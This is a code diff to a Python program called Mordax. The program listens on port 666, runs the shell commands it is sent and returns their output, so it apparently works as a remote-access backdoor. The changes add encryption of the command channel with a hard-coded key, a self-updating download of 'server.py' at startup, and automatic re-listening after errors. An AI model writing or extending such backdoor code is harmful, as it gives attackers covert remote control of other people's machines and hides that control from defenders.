@@ -2,11 +2,14 @@ import socket
 import subprocess
 import os
 import sys
+import Crypt
+import CheckVersion
+
 host = ""
 port = 666
 import threading
 
-class Mordax():
+class Mordax(Crypt.Crypt, CheckVersion.checkVersion):
 
     def __init__(self):
 
@@ -14,10 +17,16 @@ class Mordax():
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.s.bind((host, port))
         self.s.listen(3)
+        self.setVersion(1.0)
+        self.checkVersion()
+        if self.checkVersion():
+            self.downloadVersion("server.py")
 
     def start(self):
 
         self.connection, self.addr = self.s.accept()
+        self.iv = self.depad(self.connection.recv(256))
+        self.KeyAndIv("mordax", self.iv)
 
         if self.connection and self.addr:
             connect = threading.Thread(target=self.server)
@@ -28,7 +37,8 @@ class Mordax():
 
         while True:
             try:
-                data = self.connection.recv(2048)
+                data = self.decode(self.connection.recv(2048))
+                data = self.depad(data)
                 if data[:2] == "cd":
                     path = data[3:]
                     try:
@@ -53,15 +63,16 @@ class Mordax():
                     if size > 2048:
                         size = sys.getsizeof(stdout)
                         size = str(size)
-                        self.connection.send("SIZE" + "; " + size)
-                        self.connection.send(stdout)
+                        self.connection.send(self.encode("SIZE" + "; " + size))
+                        self.connection.send(self.encode(stdout))
                     else:
-                        self.connection.send(stdout)
+                        self.connection.send(self.encode(stdout))
 
             except socket.error as error:
                 self.connection.close()
+                self.start()
                 self.connection, addr = self.s.accept()
-                print(addr)
+                print(addr, error)
 
 
 
